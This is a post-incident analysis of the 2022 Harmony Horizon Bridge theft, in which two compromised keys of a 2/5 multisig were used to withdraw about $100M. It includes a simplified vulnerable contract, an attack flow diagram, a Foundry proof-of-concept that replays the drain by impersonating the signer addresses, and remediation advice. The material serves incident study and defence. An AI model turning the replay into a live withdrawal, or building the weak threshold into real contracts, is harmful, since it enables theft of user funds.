# Harmony Bridge — Multisig Key Compromise Analysis

| Field | Details |
|------|------|
| **Date** | 2022-06-23 |
| **Protocol** | Harmony Horizon Bridge |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$100,000,000 |
| **Attacker** | [0xf845A7ee...](https://etherscan.io/address/0xf845A7ee8477AD1FB4446651E548901a2635A915) |
| **Attack Tx** | [0x27981c72...](https://etherscan.io/tx/0x27981c7289c372e601c9475e5b5466310be18ed10b59d1ac840145f6e7804c97) |
| **Vulnerable Contract** | [0x715CdDa5...](https://etherscan.io/address/0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6) |
| **Root Cause** | 2 validator keys compromised from a 2/5 multisig bridge — immediate large-scale asset withdrawal |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Harmony_multisig_exp.sol) |

---
## 1. Vulnerability Overview

Harmony's Horizon Bridge operated on a 2/5 multisig structure where 2 out of 5 signers were required to authorize asset transfers. Similar to the Ronin incident (2022-03), the attacker (suspected to be the North Korean Lazarus Group) compromised the private keys of 2 signers and used valid 2/2 signatures to withdraw approximately $100M worth of assets including ETH, BNB, and USDT. The low threshold of 2/5 and poor key management practices were the root causes.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable: 2/5 low threshold — compromising 2 keys is sufficient
contract MultiSigWallet {
    uint256 public required = 2;  // ← threshold too low!
    address[] public owners;     // 5 signers

    function confirmTransaction(uint256 transactionId) public onlyOwner {
        confirmations[transactionId][msg.sender] = true;
        // 2 signatures allow immediate execution
        if (isConfirmed(transactionId)) {
            executeTransaction(transactionId);
        }
    }

    function isConfirmed(uint256 transactionId) public view returns (bool) {
        uint256 count = 0;
        for (uint i = 0; i < owners.length; i++) {
            if (confirmations[transactionId][owners[i]]) count++;
            if (count == required) return true;  // only required=2 needs to be met
        }
        return false;
    }
}

// ✅ Fix: higher threshold + timelock
// required = 4/5 or 3/5
// 24-48 hour timelock on large withdrawals
// Hardware wallet + MPC key management
```

### On-chain Original Code

Source: Sourcify verified


**MultiSigWallet.sol** — entry point:
```solidity
// ❌ Root Cause: 2 validator keys compromised from a 2/5 multisig bridge — immediate large-scale asset withdrawal
    function addOwner(address owner)
        public
        onlyWallet
        ownerDoesNotExist(owner)
        notNull(owner)
        validRequirement(owners.length + 1, required)
    {
        isOwner[owner] = true;
        owners.push(owner);
        emit OwnerAddition(owner);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Lazarus Group)
 ├─1─► Compromised private keys of 2 signers
 │       via spearphishing/malware targeting
 │       Harmony employees
 │
 ├─2─► Called submitTransaction from attacker address:
 │       unlockToken(USDT, 9,981,000,000, recipient)
 │
 ├─3─► confirmTransaction with compromised key1
 │       → 1/2 signatures complete
 │
 ├─4─► confirmTransaction with compromised key2
 │       → 2/2 signatures complete → immediate execution!
 │       → 9,981,000 USDT transferred
 │
 ├─5─► Repeated withdrawal pattern for ETH, BNB, etc.
 │
 └─6─► Total ~$100M stolen
       Laundered via Tornado Cash
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public {
    emit log_named_uint("USDT before:", usdt.balanceOf(address(this)));

    // 2/5 multisig — assuming 2 signer keys have been compromised

    // Submit transaction with first compromised key
    cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);
    // unlockToken(USDT, 9981000000000, recipient) calldata
    bytes memory _message = buildMessage(address(this));
    uint256 txId = MultiSigWallet.submitTransaction(
        0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857,  // destination
        0,
        _message
    );

    // Confirm first signature
    emit log_named_address(
        "First signer:",
        MultiSigWallet.getConfirmations(txId)[0]
    );

    // Confirm with second compromised key → immediate execution!
    cheat.prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25);
    MultiSigWallet.confirmTransaction(txId);
    // → 2/5 threshold reached → 9,981,000 USDT automatically transferred

    emit log_named_uint("USDT after:", usdt.balanceOf(address(this)));
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **CWE** | CWE-269: Improper Privilege Management |
| **Vulnerability Type** | Private key compromise / Low multisig threshold |
| **DASP** | #4 - External Calls / Key Management |
| **Attack Technique** | Signer key compromise via spearphishing |
| **Precondition** | 2 keys compromised from a 2/5 threshold |

## 6. Remediation Recommendations

1. **Higher threshold**: High-value assets like bridges should require a minimum 3/5 or higher threshold
2. **Timelock**: Apply 24-48 hour delays on large withdrawals
3. **HSM/MPC key management**: Use hardware security modules instead of software keys
4. **Anomalous transaction monitoring**: Automated suspension system for abnormal withdrawals
5. **Signer diversification**: Ensure employees from the same organization do not make up the majority of signers

## 7. Lessons Learned

- **Repeated within a month of Ronin**: Ronin ($625M) in March 2022, followed by Harmony ($100M) in June 2022 — the same type of attack recurred within the same year. Bridge operators failed to learn lessons quickly enough.
- **Danger of low thresholds**: 2/5 sets an extremely low barrier for attackers. Lowering the threshold for operational efficiency is particularly dangerous.